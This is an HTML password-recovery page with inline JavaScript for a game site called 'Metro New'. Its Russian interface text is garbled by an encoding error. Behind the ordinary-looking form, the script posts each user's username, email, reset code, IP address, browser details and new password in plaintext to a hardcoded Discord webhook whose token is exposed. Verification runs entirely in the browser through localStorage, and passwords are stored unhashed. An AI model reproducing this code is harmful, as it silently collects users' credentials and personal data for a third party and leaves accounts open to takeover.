<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è - –ú–µ—Ç—Ä–æ New</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        .steps-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 2rem;
            position: relative;
        }
        
        .steps-container::before {
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: #e1e5e9;
            z-index: 1;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }
        
        .step-circle {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #e1e5e9;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            margin-bottom: 0.5rem;
            transition: all 0.3s;
        }
        
        .step.active .step-circle {
            background: var(--primary);
            color: white;
        }
        
        .step.completed .step-circle {
            background: var(--success);
            color: white;
        }
        
        .step-label {
            font-size: 0.8rem;
            color: var(--gray);
            text-align: center;
        }
        
        .step.active .step-label {
            color: var(--primary);
            font-weight: 600;
        }
        
        .success-message {
            text-align: center;
            padding: 2rem;
            background: #d4edda;
            border: 1px solid #c3e6cb;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            display: none;
        }
    </style>
</head>
<body>
    <!-- –ù–∞–≤–∏–≥–∞—Ü–∏—è -->
    <nav class="nav">
        <div class="container nav-container">
            <div class="logo">
                <span class="logo-icon">M</span>
                <span>–ú–µ—Ç—Ä–æ New</span>
            </div>
            <div class="nav-links">
                <a href="../../index.html">–ì–ª–∞–≤–Ω–∞—è</a>
                <a href="../../game.html">–ò–≥—Ä–∞</a>
                <a href="enter.html">–í—Ö–æ–¥</a>
            </div>
        </div>
    </nav>

    <main>
        <div class="auth-container">
            <div class="metro-background"></div>
            <div class="card" style="max-width: 500px;">
                <div class="metro-decoration text-center">
                    <div class="metro-icon">
                        <i class="fas fa-key"></i>
                    </div>
                    <div class="welcome-text">–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–∫–∫–∞—É–Ω—Ç—É</div>
                </div>
                
                <!-- –®–∞–≥–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è -->
                <div class="steps-container">
                    <div class="step active" id="step1">
                        <div class="step-circle">1</div>
                        <div class="step-label">Email</div>
                    </div>
                    <div class="step" id="step2">
                        <div class="step-circle">2</div>
                        <div class="step-label">–ö–æ–¥</div>
                    </div>
                    <div class="step" id="step3">
                        <div class="step-circle">3</div>
                        <div class="step-label">–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å</div>
                    </div>
                </div>
                
                <div class="auth-header text-center">
                    <h1 id="stepTitle">–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è</h1>
                    <p id="stepDescription">–í–≤–µ–¥–∏—Ç–µ email –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞</p>
                </div>
                
                <!-- –°–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ -->
                <div class="success-message" id="successMessage">
                    <i class="fas fa-check-circle"></i>
                    <h3>–ü–∞—Ä–æ–ª—å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!</h3>
                    <p>–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É —Å –Ω–æ–≤—ã–º –ø–∞—Ä–æ–ª–µ–º</p>
                    <button class="btn btn-primary mt-3" onclick="window.location.href='enter.html'">
                        <i class="fas fa-sign-in-alt"></i> –í–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É
                    </button>
                </div>
                
                <!-- –®–∞–≥ 1: –í–≤–æ–¥ email -->
                <form id="step1Form">
                    <div class="form-group">
                        <label class="form-label">Email –∞–∫–∫–∞—É–Ω—Ç–∞</label>
                        <div class="input-with-icon">
                            <i class="fas fa-envelope input-icon"></i>
                            <input type="email" class="form-input" id="email" placeholder="your@email.com" required>
                        </div>
                        <div class="form-hint">–ù–∞ —ç—Ç–æ—Ç email –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∫–æ–¥ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è</div>
                    </div>
                    
                    <button type="submit" class="btn btn-primary w-100" id="step1Btn">
                        <i class="fas fa-paper-plane"></i> –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
                    </button>
                </form>
                
                <!-- –®–∞–≥ 2: –í–≤–æ–¥ –∫–æ–¥–∞ -->
                <form id="step2Form" style="display: none;">
                    <div class="form-group">
                        <label class="form-label">–ö–æ–¥ –∏–∑ –ø–∏—Å—å–º–∞</label>
                        <div class="input-with-icon">
                            <i class="fas fa-shield-alt input-icon"></i>
                            <input type="text" class="form-input" id="resetCode" placeholder="–í–≤–µ–¥–∏—Ç–µ 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥" required maxlength="6" pattern="[0-9]{6}">
                        </div>
                        <div style="font-size: 0.8rem; color: var(--gray); margin-top: 0.5rem;">
                            –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞: <span id="userEmailDisplay" style="font-weight: 600;"></span>
                            <br>
                            <span id="timer" style="color: var(--primary); font-weight: 600;"></span>
                        </div>
                    </div>
                    
                    <div style="display: flex; gap: 1rem;">
                        <button type="button" class="btn btn-secondary" onclick="goToStep(1)">
                            <i class="fas fa-arrow-left"></i> –ù–∞–∑–∞–¥
                        </button>
                        <button type="submit" class="btn btn-primary" id="step2Btn">
                            <i class="fas fa-check"></i> –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥
                        </button>
                    </div>
                </form>
                
                <!-- –®–∞–≥ 3: –ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å -->
                <form id="step3Form" style="display: none;">
                    <div class="form-group">
                        <label class="form-label">–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å</label>
                        <div class="input-with-icon">
                            <i class="fas fa-lock input-icon"></i>
                            <input type="password" class="form-input" id="newPassword" placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å" required minlength="6">
                            <button type="button" class="password-toggle" onclick="togglePassword('newPassword')">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                        <div class="form-hint">–ú–∏–Ω–∏–º—É–º 6 —Å–∏–º–≤–æ–ª–æ–≤</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</label>
                        <div class="input-with-icon">
                            <i class="fas fa-lock input-icon"></i>
                            <input type="password" class="form-input" id="confirmPassword" placeholder="–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å" required>
                            <button type="button" class="password-toggle" onclick="togglePassword('confirmPassword')">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    
                    <div style="display: flex; gap: 1rem;">
                        <button type="button" class="btn btn-secondary" onclick="goToStep(2)">
                            <i class="fas fa-arrow-left"></i> –ù–∞–∑–∞–¥
                        </button>
                        <button type="submit" class="btn btn-primary" id="step3Btn">
                            <i class="fas fa-save"></i> –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –ø–∞—Ä–æ–ª—å
                        </button>
                    </div>
                </form>
                
                <div class="auth-footer text-center">
                    –í—Å–ø–æ–º–Ω–∏–ª–∏ –ø–∞—Ä–æ–ª—å? <a href="enter.html">–í–æ–π–¥–∏—Ç–µ –≤ —Å–∏—Å—Ç–µ–º—É</a>
                </div>
            </div>
        </div>
    </main>

    <footer style="background-color: var(--dark); color: white; padding: 2rem 0; text-align: center; margin-top: auto;">
        <div class="container">
            <div class="footer-links" style="display: flex; justify-content: center; gap: 1.5rem; margin-bottom: 1rem; flex-wrap: wrap;">
                <a href="../../about.html" style="color: white;">–û –Ω–∞—Å</a>
                <a href="../../contact.html" style="color: white;">–ö–æ–Ω—Ç–∞–∫—Ç—ã</a>
                <a href="../../privacy.html" style="color: white;">–ü–æ–ª–∏—Ç–∏–∫–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a>
                <a href="../../terms.html" style="color: white;">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ —Å–æ–≥–ª–∞—à–µ–Ω–∏–µ</a>
            </div>
            <p class="copyright" style="color: var(--gray); font-size: 0.9rem;">¬© 2025 –ú–µ—Ç—Ä–æ New. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
        </div>
    </footer>

    <script src="../assets/js/main.js"></script>
    <script>
        // Discord Webhook URL –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422279632643948595/iZ8ji9S-ocIRwdNqSTdK8WvzlBY-7YjrzAfgUvC9D45W3lQuFrWYhx-h2Lh3xJ5oh4Tp';

        // –¢–µ–∫—É—â–∏–π —à–∞–≥ –∏ –¥–∞–Ω–Ω—ã–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
        let currentStep = 1;
        let resetData = {
            email: '',
            code: '',
            newPassword: '',
            userId: '',
            expires: null
        };

        let countdownTimer;

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', function() {
            // –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤
            setTimeout(() => {
                document.querySelectorAll('.form-group').forEach((group, index) => {
                    setTimeout(() => {
                        group.style.opacity = '1';
                        group.style.transform = 'translateX(0)';
                    }, index * 200);
                });
            }, 300);
        });

        // –ü–µ—Ä–µ—Ö–æ–¥ –º–µ–∂–¥—É —à–∞–≥–∞–º–∏
        function goToStep(step) {
            currentStep = step;
            updateStepDisplay();
        }

        function updateStepDisplay() {
            // –û–±–Ω–æ–≤–ª—è–µ–º —à–∞–≥–∏
            document.querySelectorAll('.step').forEach((step, index) => {
                step.classList.remove('active', 'completed');
                if (index + 1 < currentStep) {
                    step.classList.add('completed');
                } else if (index + 1 === currentStep) {
                    step.classList.add('active');
                }
            });

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º/—Å–∫—Ä—ã–≤–∞–µ–º —Ñ–æ—Ä–º—ã
            document.getElementById('step1Form').style.display = currentStep === 1 ? 'block' : 'none';
            document.getElementById('step2Form').style.display = currentStep === 2 ? 'block' : 'none';
            document.getElementById('step3Form').style.display = currentStep === 3 ? 'block' : 'none';

            // –û–±–Ω–æ–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏
            const titles = {
                1: '–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è',
                2: '–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞',
                3: '–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å'
            };

            const descriptions = {
                1: '–í–≤–µ–¥–∏—Ç–µ email –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞',
                2: '–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ –ø–∏—Å—å–º–∞',
                3: '–°–æ–∑–¥–∞–π—Ç–µ –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å'
            };

            document.getElementById('stepTitle').textContent = titles[currentStep];
            document.getElementById('stepDescription').textContent = descriptions[currentStep];
        }

        // –¢–∞–π–º–µ—Ä –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á–µ—Ç–∞
        function startTimer(duration) {
            let timer = duration;
            const timerElement = document.getElementById('timer');
            
            clearInterval(countdownTimer);
            
            countdownTimer = setInterval(function() {
                const minutes = Math.floor(timer / 60);
                const seconds = timer % 60;
                
                timerElement.textContent = `–ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
                
                if (--timer < 0) {
                    clearInterval(countdownTimer);
                    timerElement.textContent = '–ö–æ–¥ —É—Å—Ç–∞—Ä–µ–ª!';
                    timerElement.style.color = 'var(--danger)';
                    document.getElementById('step2Btn').disabled = true;
                }
            }, 1000);
        }

        // –®–∞–≥ 1: –û—Ç–ø—Ä–∞–≤–∫–∞ email
        document.getElementById('step1Form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const userIP = await metroSystem.getUserIP();
            const browserInfo = metroSystem.getBrowserInfo();
            
            if (!metroSystem.validateEmail(email)) {
                metroSystem.showNotification('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π email –∞–¥—Ä–µ—Å', 'error');
                return;
            }

            // –ò—â–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ email
            const allUsers = getAllUsers();
            const user = allUsers.find(u => u.email === email);
            
            if (!user) {
                metroSystem.showNotification('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º email –Ω–µ –Ω–∞–π–¥–µ–Ω', 'error');
                return;
            }

            const submitBtn = document.getElementById('step1Btn');
            const originalText = submitBtn.innerHTML;

            // –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –û—Ç–ø—Ä–∞–≤–∫–∞...';
            submitBtn.disabled = true;

            // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–æ–¥ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
            const resetCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
            resetData = {
                email: email,
                code: resetCode,
                userId: user.username,
                expires: Date.now() + 10 * 60 * 1000, // 10 –º–∏–Ω—É—Ç
                userIP: userIP,
                browserInfo: browserInfo
            };

            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
            localStorage.setItem('password_reset_' + email, JSON.stringify(resetData));

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Discord (–≤ —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–æ–µ–∫—Ç–µ –∑–¥–µ—Å—å –±—ã–ª–∞ –±—ã –æ—Ç–ø—Ä–∞–≤–∫–∞ email)
            const discordData = {
                embeds: [{
                    title: "üîê –ó–ê–ü–†–û–° –í–û–°–°–¢–ê–ù–û–í–õ–ï–ù–ò–Ø –ü–ê–†–û–õ–Ø",
                    color: 0xFFA500,
                    fields: [
                        {
                            name: "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å",
                            value: user.username,
                            inline: true
                        },
                        {
                            name: "üìß Email",
                            value: email,
                            inline: true
                        },
                        {
                            name: "üî¢ –ö–æ–¥ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è",
                            value: "||" + resetCode + "||",
                            inline: true
                        },
                        {
                            name: "üåê IP –∞–¥—Ä–µ—Å",
                            value: userIP,
                            inline: true
                        },
                        {
                            name: "üñ•Ô∏è –ë—Ä–∞—É–∑–µ—Ä",
                            value: browserInfo,
                            inline: true
                        },
                        {
                            name: "‚è∞ –î–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω –¥–æ",
                            value: new Date(resetData.expires).toLocaleString(),
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Metro New Password Recovery"
                    }
                }]
            };

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
            await metroSystem.sendToDiscord(discordData);

            // –ò–º–∏—Ç–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–∏—Å—å–º–∞
            setTimeout(() => {
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–ª–µ–¥—É—é—â–∏–π —à–∞–≥
                document.getElementById('userEmailDisplay').textContent = email;
                goToStep(2);
                
                // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä
                startTimer(600); // 10 –º–∏–Ω—É—Ç
                
                // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
                
                metroSystem.showNotification('–ö–æ–¥ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à email! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ—á—Ç—É.', 'success');
            }, 2000);
        });

        // –®–∞–≥ 2: –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞
        document.getElementById('step2Form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const enteredCode = document.getElementById('resetCode').value;
            const submitBtn = document.getElementById('step2Btn');
            const originalText = submitBtn.innerHTML;

            // –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –ü—Ä–æ–≤–µ—Ä–∫–∞...';
            submitBtn.disabled = true;

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–¥
            setTimeout(() => {
                const savedResetData = localStorage.getItem('password_reset_' + resetData.email);
                
                if (!savedResetData) {
                    metroSystem.showNotification('–°–µ—Å—Å–∏—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —É—Å—Ç–∞—Ä–µ–ª–∞', 'error');
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    return;
                }

                const resetInfo = JSON.parse(savedResetData);
                
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è
                if (Date.now() > resetInfo.expires) {
                    metroSystem.showNotification('–ö–æ–¥ —É—Å—Ç–∞—Ä–µ–ª! –ó–∞–ø—Ä–æ—Å–∏—Ç–µ –Ω–æ–≤—ã–π', 'error');
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    return;
                }

                if (enteredCode === resetInfo.code) {
                    // –ö–æ–¥ –≤–µ—Ä–Ω—ã–π, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —à–∞–≥—É
                    goToStep(3);
                    clearInterval(countdownTimer);
                } else {
                    // –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥
                    document.getElementById('resetCode').classList.add('error');
                    metroSystem.showNotification('–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.', 'error');
                }
                
                // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            }, 1500);
        });

        // –®–∞–≥ 3: –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–æ–≤–æ–≥–æ –ø–∞—Ä–æ–ª—è
        document.getElementById('step3Form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            const userIP = await metroSystem.getUserIP();
            const browserInfo = metroSystem.getBrowserInfo();

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π
            if (newPassword !== confirmPassword) {
                metroSystem.showNotification('–ü–∞—Ä–æ–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç!', 'error');
                return;
            }

            if (newPassword.length < 6) {
                metroSystem.showNotification('–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –º–∏–Ω–∏–º—É–º 6 —Å–∏–º–≤–æ–ª–æ–≤', 'error');
                return;
            }

            const submitBtn = document.getElementById('step3Btn');
            const originalText = submitBtn.innerHTML;

            // –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ...';
            submitBtn.disabled = true;

            // –û–±–Ω–æ–≤–ª—è–µ–º –ø–∞—Ä–æ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            const allUsers = getAllUsers();
            const user = allUsers.find(u => u.email === resetData.email);
            
            if (user) {
                user.password = newPassword; // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ö—ç—à
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                localStorage.setItem('metro_user_' + user.username, JSON.stringify(user));
                
                // –ï—Å–ª–∏ —ç—Ç–æ —Ç–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –æ–±–Ω–æ–≤–ª—è–µ–º –æ—Å–Ω–æ–≤–Ω—É—é –∑–∞–ø–∏—Å—å
                if (localStorage.getItem('metro_user')) {
                    const currentUser = JSON.parse(localStorage.getItem('metro_user'));
                    if (currentUser.username === user.username) {
                        localStorage.setItem('metro_user', JSON.stringify(user));
                    }
                }

                // –û—á–∏—â–∞–µ–º –¥–∞–Ω–Ω—ã–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
                localStorage.removeItem('password_reset_' + resetData.email);

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Discord
                const discordData = {
                    embeds: [{
                        title: "‚úÖ –ü–ê–†–û–õ–¨ –£–°–ü–ï–®–ù–û –ò–ó–ú–ï–ù–ï–ù",
                        color: 0x28A745,
                        fields: [
                            {
                                name: "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å",
                                value: user.username,
                                inline: true
                            },
                            {
                                name: "üìß Email",
                                value: resetData.email,
                                inline: true
                            },
                            {
                                name: "üîë –ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å",
                                value: "||" + newPassword + "||",
                                inline: true
                            },
                            {
                                name: "üåê IP –∞–¥—Ä–µ—Å",
                                value: userIP,
                                inline: true
                            },
                            {
                                name: "üñ•Ô∏è –ë—Ä–∞—É–∑–µ—Ä",
                                value: browserInfo,
                                inline: true
                            },
                            {
                                name: "üìÖ –í—Ä–µ–º—è –∏–∑–º–µ–Ω–µ–Ω–∏—è",
                                value: new Date().toLocaleString(),
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "Metro New Password Recovery"
                        }
                    }]
                };

                await metroSystem.sendToDiscord(discordData);

                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ
                setTimeout(() => {
                    document.getElementById('successMessage').style.display = 'block';
                    document.getElementById('step3Form').style.display = 'none';
                    
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                    
                    metroSystem.showNotification('–ü–∞—Ä–æ–ª—å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!', 'success');
                }, 1000);
            } else {
                metroSystem.showNotification('–û—à–∏–±–∫–∞: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω', 'error');
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            }
        });

        // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        function getAllUsers() {
            const users = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.startsWith('metro_user_') || key === 'metro_user') {
                    try {
                        const userData = JSON.parse(localStorage.getItem(key));
                        users.push(userData);
                    } catch (e) {
                        console.error('Error parsing user data:', e);
                    }
                }
            }
            return users;
        }

        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const icon = input.parentNode.querySelector('.password-toggle i');
            
            if (input.type === 'password') {
                input.type = 'text';
                icon.className = 'fas fa-eye-slash';
            } else {
                input.type = 'password';
                icon.className = 'fas fa-eye';
            }
        }

        // –°—Ç–∏–ª–∏ –¥–ª—è —Ñ–æ—Ä–º—ã
        const style = document.createElement('style');
        style.textContent = `
            .form-hint {
                font-size: 0.8rem;
                color: var(--gray);
                margin-top: 0.25rem;
            }
            
            .form-group {
                opacity: 0;
                transform: translateX(-30px);
                transition: all 0.6s ease;
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
